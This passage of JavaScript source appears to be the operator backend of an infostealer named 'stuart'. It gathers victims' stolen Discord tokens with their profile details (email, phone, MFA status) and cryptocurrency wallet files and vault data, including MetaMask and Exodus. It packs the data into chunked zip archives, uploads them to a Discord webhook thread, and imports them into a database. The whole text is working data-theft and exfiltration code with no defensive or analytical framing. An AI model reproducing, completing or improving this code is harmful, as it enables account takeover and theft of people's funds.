  const parts = rawParts.map((p, i) => {
    // Rebuild with correct part numbers in meta
    const metaBody = Buffer.from(JSON.stringify({
      v: 1,
      source: "stuart",
      clientId: clientId || null,
      capturedAt: Date.now(),
      part: i + 1,
      parts: totalParts,
    }, null, 2), "utf8");
    const zip = createZipBuffer([
      { name: `${prefix}/meta.json`, data: metaBody },
      ...(p._files || []),
    ]);
    const filename = totalParts === 1
      ? `${baseName}.zip`
      : `${baseName}.part${i + 1}of${totalParts}.zip`;
    if (zip.length > DISCORD_PART_MAX_BYTES) {
      console.warn(`[stuart] part ${i + 1} is ${(zip.length / 1024 / 1024).toFixed(2)} MiB (limit ${(DISCORD_PART_MAX_BYTES / 1024 / 1024).toFixed(2)} MiB)`);
    } else {
      console.log(`[stuart] zip part ${i + 1}/${totalParts}: ${filename} ${(zip.length / 1024 / 1024).toFixed(2)} MiB`);
    }
    return { zip, filename, size: zip.length };
  });

  return { parts, counts, prefix, totalParts };
}

/** @deprecated single-zip helper — uses multi-part builder, returns first part shape or null */
function buildZipFromExportData(data, clientId) {
  const multi = buildZipPartsFromExportData(data, clientId);
  if (!multi) return null;
  const all = Buffer.concat(multi.parts.map(p => p.zip));
  // Prefer single zip when only one part
  if (multi.parts.length === 1) {
    return {
      zip: multi.parts[0].zip,
      filename: multi.parts[0].filename,
      counts: multi.counts,
      prefix: multi.prefix,
      parts: multi.parts,
    };
  }
  return {
    zip: multi.parts[0].zip,
    filename: multi.parts[0].filename,
    counts: multi.counts,
    prefix: multi.prefix,
    parts: multi.parts,
  };
}

function collectExportData(db, clientId) {
  const result = emptyExportData();
  for (const [key, cfg] of Object.entries(TABLE_CFGS)) {
    if (!result[key] && key !== "discord_profiles") continue;
    const wheres = [];
    const args = [];
    if (clientId) {
      wheres.push("client_id = ?");
      args.push(clientId);
    }
    const where = wheres.length ? ` WHERE ${wheres.join(" AND ")}` : "";
    const rows = db.prepare(`SELECT ${cfg.sel} FROM ${cfg.tbl}${where} ORDER BY ${cfg.order}`).all(...args);
    if (result[key] !== undefined) result[key] = rows;
    else result[key] = rows;
  }
  if (clientId) {
    const profiles = db.prepare(`
      SELECT dt.client_id as clientId, dt.token, dt.source,
             dp.user_id, dp.username, dp.discriminator, dp.global_name,
             dp.email, dp.phone, dp.verified, dp.mfa_enabled, dp.premium_type,
             dp.friends_count, dp.guilds_count, dp.guild_names, dp.error
      FROM discord_tokens dt
      LEFT JOIN discord_profiles dp ON dp.token = dt.token
      WHERE dt.client_id = ?
      ORDER BY dt.captured_at DESC
    `).all(clientId);
    result.discord_profiles = profiles;
  }
  return result;
}

function buildHarvestZip(db, clientId) {
  return buildZipFromExportData(collectExportData(db, clientId), clientId);
}

function buildDiscordSummary(clientId, counts) {
  const lines = [
    `**Stuart harvest**`,
    `client_id: \`${clientId || "unknown"}\``,
    `Time: ${new Date().toISOString()}`,
    "",
    "```",
  ];
  const order = EXPORT_FILE_ORDER.filter(k => counts[k]);
  for (const k of order) lines.push(`${k.padEnd(18)} ${String(counts[k]).padStart(6)}`);
  if (!order.length) lines.push("(empty)");
  lines.push("```");
  return lines.join("\n").slice(0, 1900);
}

function forumThreadName(clientId) {
  const prefix = (pluginSettings.discord_thread_prefix || "Stuart").replace(/[^\w\s\-_.]/g, "").trim() || "Stuart";
  const short = clientId ? safeFsName(clientId).slice(0, 40) : "global";
  const stamp = new Date().toISOString().slice(0, 16).replace("T", " ");
  return `${prefix} ${short} ${stamp}`.slice(0, 100);
}

function zipPartAsBlob(part) {
  // Detach from Buffer pool / shared ArrayBuffer so FormData size is exact
  const buf = Buffer.isBuffer(part.zip) ? part.zip : Buffer.from(part.zip);
  const u8 = new Uint8Array(buf.byteLength);
  u8.set(buf);
  return new Blob([u8], { type: "application/zip" });
}

/**
 * Post zip parts to Discord.
 * - New forum post: pass threadName (no threadId)
 * - Same forum post/thread: pass threadId (no threadName) so wallets land in the log post
 * On 413, falls back to one file per message in that same thread.
 * @param {{ zip: Buffer, filename: string }[]} parts
 */
async function postZipsToDiscordWebhook({ webhookUrl, parts, content, threadName, threadId: existingThreadId }) {
  if (!parts?.length) throw new Error("no zip parts");
  const n = Math.min(parts.length, DISCORD_MAX_PARTS);
  const useParts = parts.slice(0, n);

  const sizes = useParts.map(p => `${p.filename}=${(p.size / 1024 / 1024).toFixed(2)}MiB`).join(", ");
  console.log(`[stuart] Discord upload attempt: ${useParts.length} file(s) [${sizes}] thread=${existingThreadId || "new"}`);

  async function postOnce(partList, opts = {}) {
    const form = new FormData();
    const payload = { content: opts.content ?? content };
    if (opts.threadName && !opts.threadId) payload.thread_name = opts.threadName;
    form.append("payload_json", JSON.stringify(payload));
    for (let i = 0; i < partList.length; i++) {
      form.append(`files[${i}]`, zipPartAsBlob(partList[i]), partList[i].filename);
    }
    let url = webhookUrl.trim();
    const qs = new URLSearchParams();
    qs.set("wait", "true");
    if (opts.threadId) qs.set("thread_id", String(opts.threadId));
    url += (url.includes("?") ? "&" : "?") + qs.toString();

    const res = await fetch(url, { method: "POST", body: form });
    const text = await res.text().catch(() => "");
    if (!res.ok) {
      const err = new Error(`Discord webhook HTTP ${res.status}: ${text.slice(0, 400)}`);
      err.status = res.status;
      err.body = text;
      throw err;
    }
    try { return JSON.parse(text); } catch (_) { return { ok: true }; }
  }

  // Prefer one file at a time for wallet packs (more reliable under 8 MiB guild limits)
  const oneByOne = useParts.length > 1 || useParts.some(p => p.size > 4 * 1024 * 1024);

  async function uploadSequentially() {
    let firstMsg = null;
    let threadId = existingThreadId || null;
    const errors = [];
    for (let i = 0; i < useParts.length; i++) {
      const p = useParts[i];
      if (p.size > DISCORD_PART_MAX_BYTES) {
        console.error(
          `[stuart] SKIP Discord part ${p.filename} (${(p.size / 1024 / 1024).toFixed(2)} MiB > limit) — not aborting siblings`
        );
        errors.push(p.filename);
        continue;
      }
      const partContent = useParts.length > 1
        ? `${content}\n\n_Part **${i + 1}/${useParts.length}**: \`${p.filename}\` (${(p.size / 1024 / 1024).toFixed(2)} MiB)_`
        : content;
      try {
        let msg;
        if (!threadId) {
          msg = await postOnce([p], { threadName, content: partContent });
          threadId = msg?.channel_id || null;
          firstMsg = msg;
        } else {
          msg = await postOnce([p], { threadId, content: partContent });
          if (!firstMsg) firstMsg = msg;
          else if (msg?.attachments) {
            firstMsg.attachments = [...(firstMsg.attachments || []), ...msg.attachments];
          }
        }
        console.log(`[stuart] Discord part ${i + 1}/${useParts.length} ok: ${p.filename}`);
      } catch (err) {
        console.error(`[stuart] Discord part FAILED ${p.filename}: ${err.message}`);
        errors.push(p.filename);
        // continue other parts (don't lose Exodus because MetaMask failed)
      }
    }
    if (!firstMsg && errors.length === useParts.length) {
      throw new Error(`All Discord parts failed: ${errors.join(", ")}`);
    }
    return firstMsg || { ok: true, channel_id: threadId, partialErrors: errors };
  }

  if (oneByOne) {
    try {
      return await uploadSequentially();
    } catch (e) {
      throw e;
    }
  }

  try {
    return await postOnce(useParts, { threadName, threadId: existingThreadId });
  } catch (e) {
    const tooBig = e.status === 413
      || /payload|too large|entity too large|maximum size|8000000|8388608/i.test(String(e.message) + String(e.body || ""));
    if (!tooBig) throw e;
    console.warn(`[stuart] multi-file Discord upload failed (${e.message}); retrying one part at a time`);
    return uploadSequentially();
  }
}

async function postZipToDiscordWebhook({ webhookUrl, zip, filename, content, threadName }) {
  return postZipsToDiscordWebhook({
    webhookUrl,
    parts: [{ zip, filename }],
    content,
    threadName,
  });
}

/** Download one Discord attachment (this zip only). Prefer CDN URL; bot auth as fallback. */
async function downloadDiscordAttachment(att) {
  const url = att?.url || att?.proxy_url;
  if (!url) throw new Error("attachment has no url");
  const headers = {};
  if (pluginSettings.discord_bot_token) {
    headers.Authorization = `Bot ${pluginSettings.discord_bot_token.trim()}`;
  }
  let res = await fetch(url, { headers });
  if (!res.ok && headers.Authorization) {
    // retry without bot auth (some CDNs dislike Authorization)
    res = await fetch(url);
  }
  if (!res.ok) throw new Error(`attachment download HTTP ${res.status}`);
  return Buffer.from(await res.arrayBuffer());
}

/**
 * Import all zip attachments on the webhook message that was just posted
 * (one forum post — possibly multi-part). Does not scan other threads.
 */
async function importThisWebhookZip(db, msg, fallbackClientId, localParts) {
  if (!db || !stmts) return { ok: false, reason: "no db" };

  // Fast path: import the zip parts we just built (same harvest, no CDN)
  if (localParts?.length) {
    let clientId = fallbackClientId;
    const mergedCounts = {};
    for (let i = 0; i < localParts.length; i++) {
      const p = localParts[i];
      const result = importZipIntoDb(db, p.zip, clientId || fallbackClientId);
      clientId = result.clientId || clientId;
      for (const [k, v] of Object.entries(result.counts || {}))
        mergedCounts[k] = (mergedCounts[k] || 0) + v;
      const fakeId = `local-${msg?.id || Date.now()}-p${i}-${p.filename}`;
      db.prepare(
        `INSERT OR IGNORE INTO discord_imports(attachment_id, message_id, thread_id, client_id, filename, imported_at) VALUES(?,?,?,?,?,?)`
      ).run(fakeId, msg?.id || null, msg?.channel_id || null, clientId, p.filename, Date.now());
    }
    try {
      pluginCtx?.broadcast?.("harvest_update", { clientId, source: "discord" });
    } catch (_) {}
    discordPollStatus = {
      lastAt: Date.now(),
      lastOk: true,
      lastError: "",
      imported: localParts.length,
      message: `imported ${localParts.length} part(s) → ${clientId}`,
    };
    return { ok: true, clientId, parts: localParts.length, counts: mergedCounts, local: true };
  }

  if (!msg) return { ok: false, reason: "no message" };

  let zips = (msg.attachments || []).filter(a => (a.filename || "").toLowerCase().endsWith(".zip"));
  if (!zips.length && pluginSettings.discord_bot_token && msg.id && msg.channel_id) {
    try {
      const full = await discordBotFetch(`/channels/${msg.channel_id}/messages/${msg.id}`);
      zips = (full?.attachments || []).filter(a => (a.filename || "").toLowerCase().endsWith(".zip"));
      if (full) msg = full;
    } catch (e) {
      console.warn("[stuart] fetch single message for attachments:", e.message);
    }
  }
  if (!zips.length) return { ok: false, reason: "no zip attachment on webhook response" };

  let clientId = fallbackClientId;
  let n = 0;
  for (const att of zips) {
    if (db.prepare(`SELECT 1 FROM discord_imports WHERE attachment_id = ?`).get(att.id)) continue;
    const zipBuf = await downloadDiscordAttachment(att);
    const result = importZipIntoDb(db, zipBuf, clientId || fallbackClientId);
    clientId = result.clientId || clientId;
    db.prepare(
      `INSERT OR IGNORE INTO discord_imports(attachment_id, message_id, thread_id, client_id, filename, imported_at) VALUES(?,?,?,?,?,?)`
    ).run(att.id, msg.id || null, msg.channel_id || null, clientId, att.filename || "", Date.now());
    n++;
    console.log(`[stuart] imported webhook zip ${att.filename} → client ${clientId}`);
  }
  if (n > 0) {
    try {
      pluginCtx?.broadcast?.("harvest_update", { clientId, source: "discord" });
    } catch (_) {}
  }
  discordPollStatus = {
    lastAt: Date.now(),
    lastOk: true,
    lastError: "",
    imported: n,
    message: `imported ${n} attachment(s) from this post → ${clientId}`,
  };
  return { ok: true, clientId, parts: n };
}

function getWalletExpect(clientId) {
  let e = pendingWalletExpect.get(clientId);
  if (!e) {
    e = { expected: new Set(), received: new Set(), done: false, maxTimer: null };
    pendingWalletExpect.set(clientId, e);
  }
  return e;
}

/** Register wallet names we must wait for (from results / wallet_auto_start). */
function noteExpectedWallets(clientId, walletsOrNames) {
  if (!walletsOrNames?.length) return;
  const e = getWalletExpect(clientId);
  for (const w of walletsOrNames) {
    const name = typeof w === "string" ? w : w?.name;
    if (!name) continue;
    e.expected.add(name);
    // Agent skips zips > 50MB — don't block forever
    const size = typeof w === "object" ? Number(w.size || 0) : 0;
    if (size > 50 * 1024 * 1024) e.received.add(name);
  }
  console.log(`[stuart] expecting ${e.expected.size} wallet(s) for Discord client=${clientId}: ${[...e.expected].join(", ")}`);
  // Absolute deadline so we never hang if an event is lost
  if (e.maxTimer) clearTimeout(e.maxTimer);
  e.maxTimer = setTimeout(() => {
    console.warn(`[stuart] wallet wait timeout client=${clientId} got=${e.received.size}/${e.expected.size} — flushing anyway`);
    e.done = true;
    scheduleDiscordFinalize(clientId, { force: true });
  }, DISCORD_WALLET_MAX_WAIT_MS);
}

function noteWalletReceived(clientId, name) {
  if (!name) return;
  const e = getWalletExpect(clientId);
  e.expected.add(name);
  e.received.add(name);
}

function noteWalletSkipped(clientId, name) {
  if (!name) return;
  const e = getWalletExpect(clientId);
  e.expected.add(name);
  e.received.add(name); // count as "done" so we don't wait forever
}

function noteWalletsDone(clientId) {
  const e = getWalletExpect(clientId);
  e.done = true;
  if (e.maxTimer) {
    clearTimeout(e.maxTimer);
    e.maxTimer = null;
  }
}

function walletsReadyForFlush(clientId) {
  const e = pendingWalletExpect.get(clientId);
  if (!e || e.expected.size === 0) return true;
  if (e.done) return true;
  for (const n of e.expected) {
    if (!e.received.has(n)) return false;
  }
  return true;
}

function clearWalletExpect(clientId) {
  const e = pendingWalletExpect.get(clientId);
  if (e?.maxTimer) clearTimeout(e.maxTimer);
  pendingWalletExpect.delete(clientId);
}

function pushBufferedWallet(clientId, entry) {
  let list = pendingDiscordWallets.get(clientId);
  if (!list) {
    list = [];
    pendingDiscordWallets.set(clientId, list);
  }
  const idx = list.findIndex(w => w.name === entry.name);
  if (idx >= 0) list[idx] = entry;
  else list.push(entry);
  noteWalletReceived(clientId, entry.name);
  console.log(
    `[stuart] Discord-buffered wallet "${entry.name}" ${(entry.content.length / 1024 / 1024).toFixed(2)} MiB ` +
    `(${list.length} buffered, ready=${walletsReadyForFlush(clientId)}) client=${clientId}`
  );
  return true;
}

function bufferDiscordWallet(clientId, payload) {
  if (!payload?.content) {
    console.warn(`[stuart] wallet_auto_data missing content name=${payload?.name}`);
    return false;
  }
  let content;
  try {
    content = Buffer.from(payload.content, "base64");
  } catch (err) {
    console.warn(`[stuart] wallet base64 decode failed name=${payload?.name}:`, err.message);
    return false;
  }
  if (!content.length) return false;
  return pushBufferedWallet(clientId, {
    name: String(payload.name || "wallet"),
    type: payload.type || null,
    path: payload.path || "",
    addresses: payload.addresses || [],
    vaultData: payload.vaultData || null,
    size: payload.size || content.length,
    content,
  });
}

/** Start / continue reassembly of a large wallet sent as wallet_auto_chunk events. */
function handleWalletChunkEvent(clientId, event, payload) {
  const name = payload?.name;
  if (!name) return;
  const key = `${clientId}\0${name}`;

  if (event === "wallet_auto_chunk_start") {
    pendingWalletChunks.set(key, {
      meta: {
        name,
        type: payload.type || null,
        path: payload.path || "",
        addresses: payload.addresses || [],
        vaultData: payload.vaultData || null,
        size: Number(payload.size) || 0,
      },
      total: Number(payload.chunks) || 0,
      chunks: new Map(),
    });
    noteExpectedWallets(clientId, [name]);
    console.log(`[stuart] wallet chunk transfer start "${name}" chunks=${payload.chunks} size=${payload.size}`);
    return;
  }

  if (event === "wallet_auto_chunk") {
    let acc = pendingWalletChunks.get(key);
    if (!acc) {
      acc = {
        meta: { name, type: null, path: "", addresses: [], vaultData: null, size: 0 },
        total: Number(payload.chunks) || 0,
        chunks: new Map(),
      };
      pendingWalletChunks.set(key, acc);
    }
    try {
      const buf = Buffer.from(payload.content || "", "base64");
      acc.chunks.set(Number(payload.chunk) || 1, buf);
      console.log(
        `[stuart] wallet chunk ${payload.chunk}/${payload.chunks || acc.total} "${name}" +${buf.length} bytes`
      );
    } catch (e) {
      console.warn(`[stuart] wallet chunk decode failed ${name}:`, e.message);
    }
    return;
  }

  if (event === "wallet_auto_chunk_end") {
    const acc = pendingWalletChunks.get(key);
    pendingWalletChunks.delete(key);
    if (!acc) {
      console.warn(`[stuart] wallet_auto_chunk_end without start: ${name}`);
      noteWalletSkipped(clientId, name);
      return;
    }
    const total = Number(payload.chunks) || acc.total || acc.chunks.size;
    const ordered = [];
    for (let i = 1; i <= total; i++) {
      const c = acc.chunks.get(i);
      if (!c) {
        console.warn(`[stuart] incomplete wallet chunks for "${name}": missing ${i}/${total}`);
        noteWalletSkipped(clientId, name);
        return;
      }
      ordered.push(c);
    }
    const content = Buffer.concat(ordered);
    console.log(`[stuart] reassembled agent wallet "${name}" ${(content.length / 1024 / 1024).toFixed(2)} MiB from ${total} chunks`);
    pushBufferedWallet(clientId, {
      name,
      type: acc.meta.type,
      path: acc.meta.path,
      addresses: acc.meta.addresses,
      vaultData: acc.meta.vaultData,
      size: content.length,
      content,
    });
  }
}

function safeWalletFileName(name, index) {
  const base = safeFsName(name || `wallet_${index}`).slice(0, 80) || `wallet_${index}`;
  return `${index}_${base}.zip`;
}

/**
 * Split one oversized wallet zip into chunked Discord parts (reassembled on import).
 * Each part ≤ DISCORD_PART_MAX_BYTES.
 */
function buildChunkedWalletParts(w, clientId, index) {
  const prefix = clientId
    ? `stuart-${safeFsName(clientId).slice(0, 28)}-wchunk`
    : "stuart-wchunk";
  const stamp = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
  const safe = safeFsName(w.name).slice(0, 40);
  // Leave room for meta + zip headers
  const chunkSize = Math.floor(DISCORD_PART_MAX_BYTES * 0.85);
  const total = Math.ceil(w.content.length / chunkSize) || 1;
  const parts = [];
  for (let i = 0; i < total && parts.length < DISCORD_MAX_PARTS; i++) {
    const slice = w.content.subarray(i * chunkSize, Math.min(w.content.length, (i + 1) * chunkSize));
    const meta = {
      v: 1,
      source: "stuart",
      kind: "wallet_chunk",
      clientId: clientId || null,
      name: w.name,
      type: w.type || null,
      path: w.path || "",
      addresses: w.addresses || [],
      vaultData: w.vaultData || null,
      size: w.content.length,
      chunk: i + 1,
      chunks: total,
    };
    const files = [
      { name: `${prefix}/meta.json`, data: Buffer.from(JSON.stringify(meta, null, 2), "utf8") },
      { name: `${prefix}/chunk.bin`, data: Buffer.from(slice) },
    ];
    const zip = createZipBuffer(files);
    const filename = `${safe}-chunk${i + 1}of${total}-${stamp}.zip`;
    console.log(`[stuart] wallet chunk ${i + 1}/${total} "${w.name}" → ${filename} ${(zip.length / 1024 / 1024).toFixed(2)} MiB`);
    parts.push({ zip, filename, size: zip.length, kind: "wallet_chunk" });
  }
  return parts;
}

/**
 * Pack desktop + extension wallet zips into ≤7.5 MiB container zips for Discord.
 * Oversized single wallets are split into chunk parts (same forum thread).
 */
function buildWalletZipParts(wallets, clientId) {
  if (!wallets?.length) return null;
  const prefix = clientId
    ? `stuart-${safeFsName(clientId).slice(0, 32)}-wallets`
    : "stuart-global-wallets";
  const stamp = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
  const baseName = clientId
    ? `stuart-${safeFsName(clientId).slice(0, 20)}-wallets-${stamp}`
    : `stuart-global-wallets-${stamp}`;

  const parts = [];
  const small = [];

  for (let i = 0; i < wallets.length; i++) {
    const w = wallets[i];
    // Already-compressed wallet zips barely shrink; if near/over limit, chunk them
    if (w.content.length > DISCORD_PART_MAX_BYTES - 64 * 1024) {
      console.warn(
        `[stuart] wallet "${w.name}" is ${(w.content.length / 1024 / 1024).toFixed(2)} MiB — splitting into chunks for Discord`
      );
      parts.push(...buildChunkedWalletParts(w, clientId, i));
    } else {
      small.push({
        file: safeWalletFileName(w.name, i),
        name: w.name,
        type: w.type,
        path: w.path,
        addresses: w.addresses || [],
        vaultData: w.vaultData || null,
        size: w.content.length,
        data: w.content,
      });
    }
  }

  // Pack small wallets into shared containers
  const bins = [];
  for (const it of small) {
    let placed = false;
    for (const bin of bins) {
      if (bin.size + it.size + 8192 <= DISCORD_PART_MAX_BYTES) {
        bin.items.push(it);
        bin.size += it.size;
        placed = true;
        break;
      }
    }
    if (!placed) bins.push({ items: [it], size: it.size });
  }

  for (let bi = 0; bi < bins.length && parts.length < DISCORD_MAX_PARTS; bi++) {
    const bin = bins[bi];
    const meta = {
      v: 1,
      source: "stuart",
      kind: "wallets",
      clientId: clientId || null,
      capturedAt: Date.now(),
      wallets: bin.items.map(it => ({
        file: it.file,
        name: it.name,
        type: it.type,
        path: it.path,
        addresses: it.addresses,
        vaultData: it.vaultData,
        size: it.size,
      })),
    };
    const files = [
      { name: `${prefix}/meta.json`, data: Buffer.from(JSON.stringify(meta, null, 2), "utf8") },
      ...bin.items.map(it => ({ name: `${prefix}/${it.file}`, data: it.data })),
    ];
    let zip = createZipBuffer(files);
    if (zip.length > DISCORD_PART_MAX_BYTES && bin.items.length > 1) {
      const mid = Math.ceil(bin.items.length / 2);
      bins.splice(bi, 1, { items: bin.items.slice(0, mid), size: 0 }, { items: bin.items.slice(mid), size: 0 });
      bi--;
      continue;
    }
    // If still over after pack (rare), fall back to chunking each wallet
    if (zip.length > DISCORD_PART_MAX_BYTES && bin.items.length === 1) {
      const only = bin.items[0];
      const w = wallets.find(x => x.name === only.name);
      if (w) {
        parts.push(...buildChunkedWalletParts(w, clientId, bi));
        continue;
      }
    }
    const filename = `${baseName}.p${parts.length + 1}.zip`;
    console.log(`[stuart] wallet zip part: ${filename} ${(zip.length / 1024 / 1024).toFixed(2)} MiB (${bin.items.length} wallets)`);
    parts.push({ zip, filename, size: zip.length, kind: "wallets" });
  }

  if (!parts.length) return null;
  if (parts.length > DISCORD_MAX_PARTS) {
    console.warn(`[stuart] truncating wallet parts ${parts.length} → ${DISCORD_MAX_PARTS}`);
    parts.length = DISCORD_MAX_PARTS;
  }
  return { parts, count: wallets.length, totalParts: parts.length };
}

/** Reassemble chunked wallet parts then write wallet_data rows. */
function importWalletPartsIntoDb(db, clientId, parts) {
  if (!parts?.length || !stmts) return { ok: false, imported: 0 };
  let imported = 0;
  const now = Date.now();
  const insWd = db.prepare(
    `INSERT OR REPLACE INTO wallet_data(client_id,name,path,type,addresses,vault_data,content,blob_path,size,captured_at) VALUES(?,?,?,?,?,?,?,?,?,?)`
  );

  // Accumulate wallet_chunk pieces: name -> { meta, chunks: Map index->Buffer }
  const chunkAcc = new Map();

  function saveWallet(cid, wname, path, type, addresses, vaultData, data) {
    let bp = null;
    if (blobDir) {
      bp = walletBlobPath(cid, wname);
      if (!writeBlob(bp, data)) bp = null;
    }
    insWd.run(
      cid, wname, path || "", type || null,
      JSON.stringify(addresses || []),
      vaultData || null,
      bp ? null : data, bp, data.length, now,
    );
    stmts.insWl.run(cid, wname, type || null, path || null, 0, data.length, now);
    imported++;
  }

  for (const p of parts) {
    const entries = unzipAll(p.zip);
    let meta = null;
    const filesByBase = new Map();
    for (const ent of entries) {
      const bn = baseName(ent.name);
      if (bn === "meta.json") {
        try { meta = JSON.parse(ent.data.toString("utf8")); } catch (_) {}
      } else {
        filesByBase.set(bn, ent.data);
        filesByBase.set(ent.name.replace(/\\/g, "/").split("/").pop(), ent.data);
      }
    }
    const cid = meta?.clientId || clientId;

    if (meta?.kind === "wallet_chunk" && meta.name) {
      const chunkData = filesByBase.get("chunk.bin");
      if (!chunkData) {
        console.warn(`[stuart] wallet_chunk missing chunk.bin for ${meta.name}`);
        continue;
      }
      let acc = chunkAcc.get(meta.name);
      if (!acc) {
        acc = { meta, chunks: new Map() };
        chunkAcc.set(meta.name, acc);
      }
      acc.chunks.set(Number(meta.chunk) || 1, chunkData);
      acc.meta = meta;
      continue;
    }

    const list = meta?.wallets || [];
    if (list.length) {
      for (const w of list) {
        const data = filesByBase.get(w.file) || filesByBase.get(baseName(w.file));
        if (!data) {
          console.warn(`[stuart] wallet file missing in container: ${w.file}`);
          continue;
        }
        saveWallet(cid, w.name, w.path, w.type, w.addresses, w.vaultData, data);
      }
    } else {
      for (const [name, data] of filesByBase) {
        if (name === "meta.json" || name === "chunk.bin" || !String(name).endsWith(".zip")) continue;
        const wname = String(name).replace(/\.zip$/i, "");
        saveWallet(cid, wname, "", null, [], null, data);
      }
    }
    stmts.upsertRun.run(cid, now);
  }

  // Finalize chunked wallets
  for (const [wname, acc] of chunkAcc) {
    const total = Number(acc.meta.chunks) || acc.chunks.size;
    const ordered = [];
    for (let i = 1; i <= total; i++) {
      const c = acc.chunks.get(i);
      if (!c) {
        console.warn(`[stuart] missing chunk ${i}/${total} for wallet ${wname}`);
        ordered.length = 0;
        break;
      }
      ordered.push(c);
    }
    if (!ordered.length) continue;
    const data = Buffer.concat(ordered);
    const cid = acc.meta.clientId || clientId;
    saveWallet(cid, wname, acc.meta.path, acc.meta.type, acc.meta.addresses, acc.meta.vaultData, data);
    stmts.upsertRun.run(cid, now);
    console.log(`[stuart] reassembled chunked wallet "${wname}" ${(data.length / 1024 / 1024).toFixed(2)} MiB`);
  }

  try {
    pluginCtx?.broadcast?.("wallet_data_update", { clientId, source: "discord" });
    pluginCtx?.broadcast?.("harvest_update", { clientId, source: "discord" });
  } catch (_) {}
  console.log(`[stuart] imported ${imported} wallet(s) from Discord containers for ${clientId}`);
  return { ok: true, imported, clientId };
}

/**
 * After harvest is fully settled:
 * 1) Upload log zip(s) → creates forum post
 * 2) Upload wallet zip(s) into the SAME thread (thread_id)
 * 3) Import both on the server for display
 */
async function flushDiscordHarvest(clientId) {
  if (!isDiscordPipelineOn()) {
    return { ok: false, skipped: true, reason: "Discord pipeline off or webhook missing" };
  }
  if (discordFlushing.has(clientId)) {
    return { ok: false, skipped: true, reason: "flush already in progress" };
  }
  discordFlushing.add(clientId);

  const buffered = pendingDiscordHarvest.get(clientId);
  pendingDiscordHarvest.delete(clientId);
  const wallets = pendingDiscordWallets.get(clientId) || [];
  pendingDiscordWallets.delete(clientId);
  clearWalletExpect(clientId);

  console.log(
    `[stuart] Discord flush start client=${clientId} logBuffer=${!!buffered} wallets=${wallets.length} ` +
    `(${wallets.map(w => w.name + ":" + (w.content?.length || 0)).join(", ")})`
  );

  try {
    let multi = null;
    if (buffered) multi = buildZipPartsFromExportData(buffered, clientId);
    if (!multi && pluginCtx?.db) {
      multi = buildZipPartsFromExportData(collectExportData(pluginCtx.db, clientId), clientId);
    }
    const walletPack = wallets.length ? buildWalletZipParts(wallets, clientId) : null;

    if (!multi?.parts?.length && !walletPack?.parts?.length) {
      return { ok: false, skipped: true, reason: "no data to export" };
    }

    const threadName = forumThreadName(clientId);
    const logContent = multi
      ? buildDiscordSummary(clientId, multi.counts) +
        (multi.totalParts > 1 ? `\nLog parts: **${multi.totalParts}**` : "") +
        (walletPack ? `\nWallets pending: **${walletPack.count}** (same post)` : "")
      : `**Stuart wallets**\nclient_id: \`${clientId}\`\nWallets: **${walletPack.count}**`;

    let msg = null;
    let threadId = null;
    let importedLogs = null;
    let importedWallets = null;

    // ── 1) Log zips (create forum post) ──────────────────────────
    if (multi?.parts?.length) {
      msg = await postZipsToDiscordWebhook({
        webhookUrl: pluginSettings.discord_webhook_url,
        parts: multi.parts,
        content: logContent,
        threadName,
      });
      threadId = msg?.channel_id || null;
      const totalBytes = multi.parts.reduce((s, p) => s + p.size, 0);
      console.log(
        `[stuart] Discord logs ok client=${clientId} parts=${multi.totalParts} bytes=${totalBytes} thread=${threadId}`
      );
      if (pluginCtx?.db) {
        try {
          importedLogs = await importThisWebhookZip(pluginCtx.db, msg, clientId, multi.parts);
        } catch (e) {
          console.warn("[stuart] log import failed:", e.message);
          importedLogs = { ok: false, error: e.message };
        }
      }
    }

    // ── 2) Wallet zips on the SAME forum post/thread ─────────────
    if (walletPack?.parts?.length) {
      const wContent = [
        `**Stuart wallets**`,
        `client_id: \`${clientId}\``,
        `Wallets: **${walletPack.count}**`,
        walletPack.totalParts > 1 ? `Parts: **${walletPack.totalParts}** (≤8MB, same post)` : "",
      ].filter(Boolean).join("\n");

      let wMsg;
      if (threadId) {
        // Same post: follow-up attachments in the log forum thread
        wMsg = await postZipsToDiscordWebhook({
          webhookUrl: pluginSettings.discord_webhook_url,
          parts: walletPack.parts,
          content: wContent,
          threadId,
        });
      } else {
        // No logs — wallets create the post
        wMsg = await postZipsToDiscordWebhook({
          webhookUrl: pluginSettings.discord_webhook_url,
          parts: walletPack.parts,
          content: wContent,
          threadName,
        });
        threadId = wMsg?.channel_id || threadId;
        msg = msg || wMsg;
      }
      console.log(
        `[stuart] Discord wallets ok client=${clientId} count=${walletPack.count} parts=${walletPack.totalParts} thread=${threadId}`
      );
      if (pluginCtx?.db) {
        try {
          importedWallets = importWalletPartsIntoDb(pluginCtx.db, clientId, walletPack.parts);
        } catch (e) {
          console.warn("[stuart] wallet import failed:", e.message);
          importedWallets = { ok: false, error: e.message };
        }
      }
    }

    return {
      ok: true,
      logParts: multi?.totalParts || 0,
      walletParts: walletPack?.totalParts || 0,
      walletCount: walletPack?.count || 0,
      filenames: [
        ...(multi?.parts || []).map(p => p.filename),
        ...(walletPack?.parts || []).map(p => p.filename),
      ],
      threadName,
      threadId,
      messageId: msg?.id || null,
      importedLogs,
      importedWallets,
    };
  } catch (err) {
    if (buffered) pendingDiscordHarvest.set(clientId, buffered);
    if (wallets.length) pendingDiscordWallets.set(clientId, wallets);
    console.error(`[stuart] Discord webhook failed:`, err.message);
    return { ok: false, error: err.message };
  } finally {
    discordFlushing.delete(clientId);
  }
}

/**
 * Schedule a single upload after harvest activity goes quiet.
 * Waits until expected wallet_auto_data is buffered (or force/timeout).
 */
function scheduleDiscordFinalize(clientId, opts = {}) {
  if (!isDiscordPipelineOn()) return;
  const key = clientId || "__all__";
  const prev = discordSettleTimers.get(key);
  if (prev) clearTimeout(prev);

  const force = !!opts.force;
  const delay = force ? 500 : DISCORD_SETTLE_MS;

  const t = setTimeout(() => {
    discordSettleTimers.delete(key);
    if (!force && !walletsReadyForFlush(clientId)) {
      const e = pendingWalletExpect.get(clientId);
      console.log(
        `[stuart] settle deferred — waiting wallets client=${clientId} ` +
        `got=${e ? e.received.size : 0}/${e ? e.expected.size : 0} [${e ? [...e.expected].filter(n => !e.received.has(n)).join(",") : ""}]`
      );
      // Re-check soon; absolute maxTimer on expect will force flush
      scheduleDiscordFinalize(clientId);
      return;
    }
    console.log(`[stuart] harvest settled for ${clientId} — Discord upload (logs + wallets)`);
    flushDiscordHarvest(clientId).catch(e =>
      console.error("[stuart] Discord flush error:", e.message)
    );
  }, delay);
  discordSettleTimers.set(key, t);
}

/** @deprecated name kept for call sites — settles only */
function scheduleDiscordUpload(_db, clientId) {
